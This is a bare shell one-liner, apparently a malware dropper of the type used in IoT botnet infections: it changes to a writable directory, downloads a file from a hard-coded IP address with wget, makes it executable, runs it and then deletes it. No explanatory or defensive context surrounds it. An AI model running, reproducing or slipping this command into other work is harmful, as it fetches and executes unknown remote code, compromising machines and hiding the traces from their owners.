cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.235.91/' '; chmod +x ' '; ./' '; rm -rf ' '
